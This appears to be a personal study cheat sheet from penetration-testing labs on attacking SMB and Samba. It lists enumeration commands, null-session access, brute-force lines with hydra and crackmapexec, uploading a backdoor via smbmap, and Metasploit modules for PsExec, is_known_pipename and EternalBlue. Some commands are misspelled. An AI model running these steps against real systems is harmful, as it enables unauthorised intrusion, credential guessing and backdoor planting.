![](</Images/Pasted image 20231202152423.png>)
![](</Images/Pasted image 20231202152550.png>)
## SMB 
common port 139/445 used for sharing files and peripherals like printers

**`IPC$`** ([`null session connection`](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/inter-process-communication-share-null-session)) - with this session, Windows lets guest _anonymous users enumerate the names of domain accounts and network shares_.

### nmap scripts for SMB
 `nmap -p445 --script smb-protocols $IP`
`smb-protocols` returns version/protocols
`smb-security-mode` returns some security info about smb
`smb-enum-sessions` enumerates sessions and shows users
`smb-enum-shares` lists differernt shares and current access type. default uses guest account
`smb-enum-users` lists additional users and their account info like password requirements
`smb-enum-domains` gives overall detailed info on shares
`smb-enum-groups` group info
`smb-ls` use like ls
`--script smb-brute --script-args userdb=users.txt,passdb=passwords.txt`

also can add args to same scripts using --script-args. this changes the outcome above when using account with more access. ex.
`--script-args smbusername=<user> smbpassword=<password>`

can also use smbmap for downloading and listing files. Examples:

download: `smbmap -u administrator -p smbserver_771 -H 10.3.25.154 --download 'C$\flag.txt'`

list director contents: `smbmap -u administrator -p smbserver_771 -H 10.3.25.154 -r c$`

brute force login using msfconsole scanner/smb/smb_login
Good user lists in metasploit-framework/data/wordlists/common...
# Samba for SMB (linux)
--script smb-os-discovery
	shows detail info on smb service
	
## msfconsole

`use auxiliary/scanner/smb/smb_version`
> show options
> set RHOSTS
> then run or exploiot

### Samba v3.5.0 most vulnerable

Exploit to get remote access
`exploit/linux/samba/is_known_pipename`
## nmblookup another tool for samba

>**`nmblookup`** - _NetBIOS over TCP/IP client used to lookup NetBIOS names_
```bash
nmclookup -A $IP
```

## smbmap
> Samba share enumerator. Lists out shares and permissions
> Usage `smbmap -H <ip> -u <user> -p <pass>`

Upload file: 
```bash
smbmap -u administrator -p 'smbserver_771' -H $IP --upload '/root/sample_backdoor' 'C$\sample_backdoor'`
```
Download file:
```bash
smbmap -u administrator -p 'smbserver_771' -H 10.2.21.233 --download 'C$\flag.txt'
```


## smbclient
> Used for enumerating shares or logging in
> usage to list shares `
```bash
smbclient -L //$IP/ -U <username> -N
> ```
>  # -L = list available services
>  # -N = no password prompt

> or `smbclient -L 10.10.233.193 -W WORKGROUP -N`
> usage to login `smbclient //<ip>/<share name> -U <username>`
> specific share use folder/share name after IP
> IPC is a null session. look for this
```bash
smbclient //<ip>/<share name> -U IPC
```
## rpcclient 

>to connect to IPC/Null
```bash
rpcclient -U "" -N 192.126.66.3
```


>once logged on as null (or anyone)...
	`enumdonusers` lists all users and RID
	`lookupnames <name>` will provide more information about
>specific accounts
>`srvinfo` will provide server info

## enum4linux
Tool for enumerating data from Windows and Samba hosts
```bash
enum4linux -a $IP
```
> -a option is to list all which returns a lot of info

```bash
enum4linux -U -o $IP
```
>Attempt to get the userlist (`-U`) and OS information (`-o`) from the target (`192.168.1.200`):

# **SMB for Windows**
## SMB
to mount SMB after discovery
`net use z: \\<ip address>\c$ <password> /user:<username>`
that maps IP C drive to local Z drive

to close SMB `net use * /delete*`

### nmap Scripts for SMB
ex `nmap -p445 --script smb-protocols <ip address>`
`smb-protocols` returns version/protocols
`smb-security-mode` returns some security info about smb
`smb-enum-sessions` enumerates sessions and shows users
`smb-enum-shares` lists different shares and current access type. default uses guest account
`smb-enum-users` lists additional users and their account info like password requirements
`smb-enum-domains` gives overall detailed info on shares
`smb-enum-groups` group info
`smb-ls` use like ls

also can add args to same scripts using --script-args. this changes the outcome above when using account with more access. ex.
`--script-args smbusername=<user> smbpassword=<password>`

## PsExec
- telnet replacement. Similar to RDP except commands are sent via cmd
- get user/pass via hyrda or metasploit
- nothing uploaded to system
- metaploit uses psexec to open meterpreter but uploads malicous file where python script doesn't. easier to avoid antivirus

run via `psexec.py username@ip address and executable` eg. cmd.exe

can also be ran without command to log in.

### metasploit option
```bash
use exploit/windows/smb/psexec
set RHOSTS $IP
set SMBUser $USER
set SMBPass $PASS
run
```

## crackmapexec
Can brute force to get credentials or execute 

Examples:
>brute force
```bash
crackmapexec smb $IP -u <username or list> -p <wordlist>
```
## Eternal Blue
affects systems Vista, 7, server 2008, 8.1, server 2012, 10, server 2016
SMBv1 might be vulnerable to eternal blue. Can check with nmap via `--script=smb-vuln-ms17-010'

once confirmed can be done via metasploit or manual python code called AutoBlue-MS17-010
`/auxiliary/scanner/smb/smb_ms17_010`

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $IP
exploit
```

### AutoBlue
Manual eternal blue exploit. Can be found [here](https://github.com/3ndG4me/AutoBlue-MS17-010.git)

## Enumeration with metasploit

`auxiliary/scanner/smb/smb_enumusers `
`auxiliary/scanner/smb/smb_enumshares`  

Brute force login
`auxiliary/scanner/smb/smb_login`

## Hydra
Can also be used for brute forcing login
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP smb
```
